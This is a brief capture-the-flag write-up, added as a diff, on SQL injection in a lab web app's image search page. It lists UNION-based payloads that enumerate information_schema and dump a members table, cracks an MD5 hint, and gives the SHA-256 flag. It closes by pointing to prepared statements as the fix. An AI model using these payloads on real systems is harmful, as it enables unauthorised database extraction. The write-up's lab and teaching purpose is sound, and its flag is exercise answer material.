@@ -1,0 +1,31 @@
+SQL Injection are executed on search image page
+
+# Test sql injection
+5 UNION SELECT NULL, NULL
+
+# Get All Tables
+5 UNION ALL SELECT TABLE_SCHEMA,NULL FROM information_schema.tables
+
+# Get All Columns
+5 UNION	ALL SELECT COLUMN_NAME,TABLE_SCHEMA FROM information_schema.columns
+
+# Get Flag from Member_images
+5 UNION ALL SELECT url,comment FROM Member_images.list_images
+
+
+ID: 5 UNION ALL SELECT url,comment FROM Member_images.list_images 
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+md5 decode of 1928e8083cf461a51303633093573c46 
+
+Result : albatroz
+
+Then encrypt 'albatroz' in sh256 
+
+# flag :
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+# BONUS :
+# Prepare statements and parameterize queries
+
+https://www.w3schools.com/php/php_mysql_prepared_statements.asp
